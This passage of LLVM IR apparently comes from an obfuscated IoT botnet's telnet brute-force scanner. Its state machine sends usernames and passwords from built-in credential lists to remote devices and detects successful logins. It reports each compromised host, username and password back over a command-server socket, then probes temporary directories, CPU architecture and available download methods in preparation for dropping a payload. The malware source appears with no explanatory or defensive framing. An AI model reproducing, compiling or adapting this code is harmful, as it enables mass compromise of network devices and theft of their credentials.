  %334 = xor i32 %332, %333
  %335 = and i32 %334, %332
  %336 = and i32 %332, -2049
  %337 = call i32 (i32, i32, ...) @fcntl(i32 %326, i32 4, i32 %335)
  %338 = load i32, i32* %6, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %339
  call void @advance_telstate(%struct.telstate_t* %340, i32 2)
  br label %341

; <label>:341:                                    ; preds = %321, %317
  br label %1218

; <label>:342:                                    ; preds = %264
  %343 = load i32, i32* %7, align 4
  %344 = icmp eq i32 %343, -1
  br i1 %344, label %345, label %349

; <label>:345:                                    ; preds = %342
  %346 = load i32, i32* %6, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %347
  call void @reset_telstate(%struct.telstate_t* %348)
  br label %1218

; <label>:349:                                    ; preds = %342
  br label %350

; <label>:350:                                    ; preds = %349
  %351 = load i32, i32* %6, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %352
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %353, i32 0, i32 7
  %355 = load i32, i32* %354, align 16
  %356 = sub i32 %355, 740567194
  %357 = add i32 %356, 7
  %358 = add i32 %357, 740567194
  %359 = add i32 %355, 7
  %360 = zext i32 %358 to i64
  %361 = call i64 @time(i64* null) #5
  %362 = icmp slt i64 %360, %361
  br i1 %362, label %363, label %367

; <label>:363:                                    ; preds = %350
  %364 = load i32, i32* %6, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %365
  call void @reset_telstate(%struct.telstate_t* %366)
  br label %367

; <label>:367:                                    ; preds = %363, %350
  br label %1217

; <label>:368:                                    ; preds = %100
  %369 = load i32, i32* %6, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %370
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %371, i32 0, i32 0
  %373 = load i32, i32* %372, align 16
  %374 = load i32, i32* %3, align 4
  %375 = load i32, i32* %6, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %376
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %377, i32 0, i32 9
  %379 = load i8*, i8** %378, align 8
  %380 = call i32 @read_until_response(i32 %373, i32 %374, i8* %379, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i32 0, i32 0))
  %381 = icmp ne i32 %380, 0
  br i1 %381, label %382, label %405

; <label>:382:                                    ; preds = %368
  %383 = call i64 @time(i64* null) #5
  %384 = trunc i64 %383 to i32
  %385 = load i32, i32* %6, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %386
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %387, i32 0, i32 7
  store i32 %384, i32* %388, align 16
  %389 = load i32, i32* %6, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %390
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %391, i32 0, i32 9
  %393 = load i8*, i8** %392, align 8
  %394 = call i32 @contains_fail(i8* %393)
  %395 = icmp ne i32 %394, 0
  br i1 %395, label %396, label %400

; <label>:396:                                    ; preds = %382
  %397 = load i32, i32* %6, align 4
  %398 = sext i32 %397 to i64
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %398
  call void @advance_telstate(%struct.telstate_t* %399, i32 0)
  br label %404

; <label>:400:                                    ; preds = %382
  %401 = load i32, i32* %6, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %402
  call void @advance_telstate(%struct.telstate_t* %403, i32 3)
  br label %404

; <label>:404:                                    ; preds = %400, %396
  br label %1218

; <label>:405:                                    ; preds = %368
  %406 = load i32, i32* %6, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %407
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %408, i32 0, i32 7
  %410 = load i32, i32* %409, align 16
  %411 = sub i32 0, 7
  %412 = sub i32 %410, %411
  %413 = add i32 %410, 7
  %414 = zext i32 %412 to i64
  %415 = call i64 @time(i64* null) #5
  %416 = icmp slt i64 %414, %415
  br i1 %416, label %417, label %421

; <label>:417:                                    ; preds = %405
  %418 = load i32, i32* %6, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %419
  call void @reset_telstate(%struct.telstate_t* %420)
  br label %421

; <label>:421:                                    ; preds = %417, %405
  br label %1217

; <label>:422:                                    ; preds = %100
  %423 = load i32, i32* %6, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %424
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %425, i32 0, i32 0
  %427 = load i32, i32* %426, align 16
  %428 = load i32, i32* %6, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %429
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %430, i32 0, i32 4
  %432 = load i8, i8* %431, align 2
  %433 = zext i8 %432 to i64
  %434 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %433
  %435 = load i8*, i8** %434, align 8
  %436 = call i32 (i32, i8*, ...) @sockprintf(i32 %427, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.276, i32 0, i32 0), i8* %435)
  %437 = icmp slt i32 %436, 0
  br i1 %437, label %438, label %442

; <label>:438:                                    ; preds = %422
  %439 = load i32, i32* %6, align 4
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %440
  call void @reset_telstate(%struct.telstate_t* %441)
  br label %1218

; <label>:442:                                    ; preds = %422
  %443 = load i32, i32* %6, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %444
  call void @advance_telstate(%struct.telstate_t* %445, i32 4)
  br label %1217

; <label>:446:                                    ; preds = %100
  %447 = load i32, i32* %6, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %448
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %449, i32 0, i32 0
  %451 = load i32, i32* %450, align 16
  %452 = load i32, i32* %3, align 4
  %453 = load i32, i32* %6, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %454
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %455, i32 0, i32 9
  %457 = load i8*, i8** %456, align 8
  %458 = call i32 @read_until_response(i32 %451, i32 %452, i8* %457, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i32 0, i32 0))
  %459 = icmp ne i32 %458, 0
  br i1 %459, label %460, label %483

; <label>:460:                                    ; preds = %446
  %461 = call i64 @time(i64* null) #5
  %462 = trunc i64 %461 to i32
  %463 = load i32, i32* %6, align 4
  %464 = sext i32 %463 to i64
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %464
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %465, i32 0, i32 7
  store i32 %462, i32* %466, align 16
  %467 = load i32, i32* %6, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %468
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %469, i32 0, i32 9
  %471 = load i8*, i8** %470, align 8
  %472 = call i32 @contains_fail(i8* %471)
  %473 = icmp ne i32 %472, 0
  br i1 %473, label %474, label %478

; <label>:474:                                    ; preds = %460
  %475 = load i32, i32* %6, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %476
  call void @advance_telstate(%struct.telstate_t* %477, i32 0)
  br label %482

; <label>:478:                                    ; preds = %460
  %479 = load i32, i32* %6, align 4
  %480 = sext i32 %479 to i64
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %480
  call void @advance_telstate(%struct.telstate_t* %481, i32 5)
  br label %482

; <label>:482:                                    ; preds = %478, %474
  br label %1218

; <label>:483:                                    ; preds = %446
  %484 = load i32, i32* %6, align 4
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %485
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %486, i32 0, i32 7
  %488 = load i32, i32* %487, align 16
  %489 = add i32 %488, -502967756
  %490 = add i32 %489, 7
  %491 = sub i32 %490, -502967756
  %492 = add i32 %488, 7
  %493 = zext i32 %491 to i64
  %494 = call i64 @time(i64* null) #5
  %495 = icmp slt i64 %493, %494
  br i1 %495, label %496, label %500

; <label>:496:                                    ; preds = %483
  %497 = load i32, i32* %6, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %498
  call void @reset_telstate(%struct.telstate_t* %499)
  br label %500

; <label>:500:                                    ; preds = %496, %483
  br label %1217

; <label>:501:                                    ; preds = %100
  %502 = load i32, i32* %6, align 4
  %503 = sext i32 %502 to i64
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %503
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %504, i32 0, i32 0
  %506 = load i32, i32* %505, align 16
  %507 = load i32, i32* %6, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %508
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %509, i32 0, i32 5
  %511 = load i8, i8* %510, align 1
  %512 = zext i8 %511 to i64
  %513 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %512
  %514 = load i8*, i8** %513, align 8
  %515 = call i32 (i32, i8*, ...) @sockprintf(i32 %506, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.276, i32 0, i32 0), i8* %514)
  %516 = icmp slt i32 %515, 0
  br i1 %516, label %517, label %521

; <label>:517:                                    ; preds = %501
  %518 = load i32, i32* %6, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %519
  call void @reset_telstate(%struct.telstate_t* %520)
  br label %1218

; <label>:521:                                    ; preds = %501
  %522 = load i32, i32* %6, align 4
  %523 = sext i32 %522 to i64
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %523
  call void @advance_telstate(%struct.telstate_t* %524, i32 6)
  br label %1217

; <label>:525:                                    ; preds = %100
  %526 = load i32, i32* %6, align 4
  %527 = sext i32 %526 to i64
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %527
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %528, i32 0, i32 0
  %530 = load i32, i32* %529, align 16
  %531 = load i32, i32* %3, align 4
  %532 = load i32, i32* %6, align 4
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %533
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %534, i32 0, i32 9
  %536 = load i8*, i8** %535, align 8
  %537 = call i32 @read_until_response(i32 %530, i32 %531, i8* %536, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %538 = icmp ne i32 %537, 0
  br i1 %538, label %539, label %610

; <label>:539:                                    ; preds = %525
  %540 = call i64 @time(i64* null) #5
  %541 = trunc i64 %540 to i32
  %542 = load i32, i32* %6, align 4
  %543 = sext i32 %542 to i64
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %543
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %544, i32 0, i32 7
  store i32 %541, i32* %545, align 16
  %546 = load i32, i32* %6, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %547
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %548, i32 0, i32 9
  %550 = load i8*, i8** %549, align 8
  %551 = call i32 @contains_fail(i8* %550)
  %552 = icmp ne i32 %551, 0
  br i1 %552, label %553, label %557

; <label>:553:                                    ; preds = %539
  %554 = load i32, i32* %6, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %555
  call void @advance_telstate(%struct.telstate_t* %556, i32 0)
  br label %609

; <label>:557:                                    ; preds = %539
  %558 = load i32, i32* %6, align 4
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %559
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %560, i32 0, i32 9
  %562 = load i8*, i8** %561, align 8
  %563 = call i32 @contains_success(i8* %562)
  %564 = icmp ne i32 %563, 0
  br i1 %564, label %565, label %604

; <label>:565:                                    ; preds = %557
  %566 = load i32, i32* %6, align 4
  %567 = sext i32 %566 to i64
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %567
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %568, i32 0, i32 3
  %570 = load i8, i8* %569, align 1
  %571 = zext i8 %570 to i32
  %572 = icmp eq i32 %571, 2
  br i1 %572, label %573, label %577

; <label>:573:                                    ; preds = %565
  %574 = load i32, i32* %6, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %575
  call void @advance_telstate(%struct.telstate_t* %576, i32 7)
  br label %603

; <label>:577:                                    ; preds = %565
  %578 = load i32, i32* @mainCommSock, align 4
  %579 = load i32, i32* %6, align 4
  %580 = sext i32 %579 to i64
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %580
  %582 = call i8* @get_telstate_host(%struct.telstate_t* %581)
  %583 = load i32, i32* %6, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %584
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %585, i32 0, i32 4
  %587 = load i8, i8* %586, align 2
  %588 = zext i8 %587 to i64
  %589 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %588
  %590 = load i8*, i8** %589, align 8
  %591 = load i32, i32* %6, align 4
  %592 = sext i32 %591 to i64
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %592
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %593, i32 0, i32 5
  %595 = load i8, i8* %594, align 1
  %596 = zext i8 %595 to i64
  %597 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %596
  %598 = load i8*, i8** %597, align 8
  %599 = call i32 (i32, i8*, ...) @sockprintf(i32 %578, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.277, i32 0, i32 0), i8* %582, i8* %590, i8* %598)
  %600 = load i32, i32* %6, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %601
  call void @advance_telstate(%struct.telstate_t* %602, i32 7)
  br label %603

; <label>:603:                                    ; preds = %577, %573
  br label %608

; <label>:604:                                    ; preds = %557
  %605 = load i32, i32* %6, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %606
  call void @reset_telstate(%struct.telstate_t* %607)
  br label %608

; <label>:608:                                    ; preds = %604, %603
  br label %609

; <label>:609:                                    ; preds = %608, %553
  br label %1218

; <label>:610:                                    ; preds = %525
  %611 = load i32, i32* %6, align 4
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %612
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %613, i32 0, i32 7
  %615 = load i32, i32* %614, align 16
  %616 = sub i32 %615, -416837457
  %617 = add i32 %616, 7
  %618 = add i32 %617, -416837457
  %619 = add i32 %615, 7
  %620 = zext i32 %618 to i64
  %621 = call i64 @time(i64* null) #5
  %622 = icmp slt i64 %620, %621
  br i1 %622, label %623, label %627

; <label>:623:                                    ; preds = %610
  %624 = load i32, i32* %6, align 4
  %625 = sext i32 %624 to i64
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %625
  call void @reset_telstate(%struct.telstate_t* %626)
  br label %627

; <label>:627:                                    ; preds = %623, %610
  br label %1217

; <label>:628:                                    ; preds = %100
  %629 = load i32, i32* %6, align 4
  %630 = sext i32 %629 to i64
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %630
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %631, i32 0, i32 0
  %633 = load i32, i32* %632, align 16
  %634 = call i32 (i32, i8*, ...) @sockprintf(i32 %633, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.278, i32 0, i32 0))
  %635 = icmp slt i32 %634, 0
  br i1 %635, label %636, label %640

; <label>:636:                                    ; preds = %628
  %637 = load i32, i32* %6, align 4
  %638 = sext i32 %637 to i64
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %638
  call void @reset_telstate(%struct.telstate_t* %639)
  br label %1218

; <label>:640:                                    ; preds = %628
  %641 = load i32, i32* %6, align 4
  %642 = sext i32 %641 to i64
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %642
  call void @advance_telstate(%struct.telstate_t* %643, i32 8)
  br label %1217

; <label>:644:                                    ; preds = %100
  store i32 0, i32* %23, align 4
  store i32 0, i32* %23, align 4
  br label %645

; <label>:645:                                    ; preds = %669, %644
  %646 = load i32, i32* %23, align 4
  %647 = icmp slt i32 %646, 5
  br i1 %647, label %648, label %674

; <label>:648:                                    ; preds = %645
  %649 = load i32, i32* %6, align 4
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %650
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %651, i32 0, i32 0
  %653 = load i32, i32* %652, align 16
  %654 = load i32, i32* %23, align 4
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tmp_dirs, i64 0, i64 %655
  %657 = load i8*, i8** %656, align 8
  %658 = load i32, i32* %23, align 4
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tmp_dirs, i64 0, i64 %659
  %661 = load i8*, i8** %660, align 8
  %662 = call i32 (i32, i8*, ...) @sockprintf(i32 %653, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.279, i32 0, i32 0), i8* %657, i8* %661)
  %663 = icmp slt i32 %662, 0
  br i1 %663, label %664, label %668

; <label>:664:                                    ; preds = %648
  %665 = load i32, i32* %6, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %666
  call void @reset_telstate(%struct.telstate_t* %667)
  br label %669

; <label>:668:                                    ; preds = %648
  br label %669

; <label>:669:                                    ; preds = %668, %664
  %670 = load i32, i32* %23, align 4
  %671 = sub i32 0, 1
  %672 = sub i32 %670, %671
  %673 = add nsw i32 %670, 1
  store i32 %672, i32* %23, align 4
  br label %645

; <label>:674:                                    ; preds = %645
  %675 = load i32, i32* %6, align 4
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %676
  call void @advance_telstate(%struct.telstate_t* %677, i32 9)
  br label %1217

; <label>:678:                                    ; preds = %100
  %679 = load i32, i32* %6, align 4
  %680 = sext i32 %679 to i64
  %681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %680
  %682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %681, i32 0, i32 0
  %683 = load i32, i32* %682, align 16
  %684 = call i32 (i32, i8*, ...) @sockprintf(i32 %683, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.280, i32 0, i32 0))
  %685 = icmp slt i32 %684, 0
  br i1 %685, label %686, label %690

; <label>:686:                                    ; preds = %678
  %687 = load i32, i32* %6, align 4
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %688
  call void @reset_telstate(%struct.telstate_t* %689)
  br label %1218

; <label>:690:                                    ; preds = %678
  %691 = load i32, i32* %6, align 4
  %692 = sext i32 %691 to i64
  %693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %692
  call void @advance_telstate(%struct.telstate_t* %693, i32 10)
  br label %1217

; <label>:694:                                    ; preds = %100
  %695 = load i32, i32* %6, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %696
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %697, i32 0, i32 0
  %699 = load i32, i32* %698, align 16
  %700 = load i32, i32* %3, align 4
  %701 = load i32, i32* %6, align 4
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %702
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %703, i32 0, i32 9
  %705 = load i8*, i8** %704, align 8
  %706 = call i32 @read_until_response(i32 %699, i32 %700, i8* %705, i32 1024, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @archs, i32 0, i32 0))
  %707 = icmp ne i32 %706, 0
  br i1 %707, label %708, label %727

; <label>:708:                                    ; preds = %694
  %709 = load i32, i32* %6, align 4
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %710
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %711, i32 0, i32 9
  %713 = load i8*, i8** %712, align 8
  %714 = load i8*, i8** %26, align 8
  %715 = bitcast i8* %714 to i8**
  %716 = call i32 @contains_string(i8* %713, i8** %715)
  %717 = icmp ne i32 %716, 0
  br i1 %717, label %718, label %722

; <label>:718:                                    ; preds = %708
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.281, i32 0, i32 0), i8** %25, align 8
  %719 = load i32, i32* %6, align 4
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %720
  call void @advance_telstate(%struct.telstate_t* %721, i32 11)
  br label %726

; <label>:722:                                    ; preds = %708
  %723 = load i32, i32* %6, align 4
  %724 = sext i32 %723 to i64
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %724
  call void @advance_telstate(%struct.telstate_t* %725, i32 0)
  br label %726

; <label>:726:                                    ; preds = %722, %718
  br label %727

; <label>:727:                                    ; preds = %726, %694
  br label %1217

; <label>:728:                                    ; preds = %100
  %729 = load i32, i32* %6, align 4
  %730 = sext i32 %729 to i64
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %730
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %731, i32 0, i32 0
  %733 = load i32, i32* %732, align 16
  %734 = call i32 (i32, i8*, ...) @sockprintf(i32 %733, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.282, i32 0, i32 0))
  %735 = icmp slt i32 %734, 0
  br i1 %735, label %736, label %740

; <label>:736:                                    ; preds = %728
  %737 = load i32, i32* %6, align 4
  %738 = sext i32 %737 to i64
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %738
  call void @reset_telstate(%struct.telstate_t* %739)
  br label %1218

; <label>:740:                                    ; preds = %728
  %741 = load i32, i32* %6, align 4
  %742 = sext i32 %741 to i64
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %742
  call void @advance_telstate(%struct.telstate_t* %743, i32 12)
  br label %1217

; <label>:744:                                    ; preds = %100
  %745 = load i32, i32* %6, align 4
  %746 = sext i32 %745 to i64
  %747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %746
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %747, i32 0, i32 0
  %749 = load i32, i32* %748, align 16
  %750 = load i32, i32* %3, align 4
  %751 = load i32, i32* %6, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %752
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %753, i32 0, i32 9
  %755 = load i8*, i8** %754, align 8
  %756 = call i32 @read_until_response(i32 %749, i32 %750, i8* %755, i32 1024, i8** getelementptr inbounds ([3 x i8*], [3 x i8*]* @checkmethod, i32 0, i32 0))
  %757 = icmp ne i32 %756, 0
  br i1 %757, label %758, label %805

; <label>:758:                                    ; preds = %744
  %759 = load i32, i32* %6, align 4
  %760 = sext i32 %759 to i64
  %761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %760
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %761, i32 0, i32 9
  %763 = load i8*, i8** %762, align 8
  %764 = load i8*, i8** %27, align 8
  %765 = bitcast i8* %764 to i8**
  %766 = call i32 @contains_string(i8* %763, i8** %765)
  %767 = icmp ne i32 %766, 0
  br i1 %767, label %768, label %772

; <label>:768:                                    ; preds = %758
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.137, i32 0, i32 0), i8** %24, align 8
  %769 = load i32, i32* %6, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %770
  call void @advance_telstate(%struct.telstate_t* %771, i32 13)
  br label %804

; <label>:772:                                    ; preds = %758
  %773 = load i32, i32* %6, align 4
  %774 = sext i32 %773 to i64
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %774
  %776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %775, i32 0, i32 9
  %777 = load i8*, i8** %776, align 8
  %778 = load i8*, i8** %28, align 8
  %779 = bitcast i8* %778 to i8**
  %780 = call i32 @contains_string(i8* %777, i8** %779)
  %781 = icmp ne i32 %780, 0
  br i1 %781, label %782, label %786

; <label>:782:                                    ; preds = %772
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.258, i32 0, i32 0), i8** %24, align 8
  %783 = load i32, i32* %6, align 4
  %784 = sext i32 %783 to i64
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %784
  call void @advance_telstate(%struct.telstate_t* %785, i32 14)
  br label %803

; <label>:786:                                    ; preds = %772
  %787 = load i32, i32* %6, align 4
  %788 = sext i32 %787 to i64
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %788
  %790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %789, i32 0, i32 9
  %791 = load i8*, i8** %790, align 8
  %792 = call i32 @contains_string(i8* %791, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @echo, i32 0, i32 0))
  %793 = icmp ne i32 %792, 0
  br i1 %793, label %794, label %798

; <label>:794:                                    ; preds = %786
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.283, i32 0, i32 0), i8** %24, align 8
  %795 = load i32, i32* %6, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %796
  call void @advance_telstate(%struct.telstate_t* %797, i32 15)
  br label %802

; <label>:798:                                    ; preds = %786
  %799 = load i32, i32* %6, align 4
  %800 = sext i32 %799 to i64
  %801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %800
  call void @advance_telstate(%struct.telstate_t* %801, i32 0)
  br label %802

; <label>:802:                                    ; preds = %798, %794
  br label %803

; <label>:803:                                    ; preds = %802, %782
  br label %804

; <label>:804:                                    ; preds = %803, %768
  br label %805

; <label>:805:                                    ; preds = %804, %744
  br label %1217

; <label>:806:                                    ; preds = %100
  %807 = load i32, i32* @mainCommSock, align 4
  %808 = load i32, i32* %6, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %809
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %810, i32 0, i32 1
  %812 = bitcast i32* %811 to %struct.in_addr*
  %813 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %812, i32 0, i32 0
  %814 = load i32, i32* %813, align 4
  %815 = call i8* @inet_ntoa(i32 %814) #5
  %816 = load i32, i32* %6, align 4
  %817 = sext i32 %816 to i64
  %818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 %817
  %819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %818, i32 0, i32 4
  %820 = load i8, i8* %819, align 2
  %821 = zext i8 %820 to i64
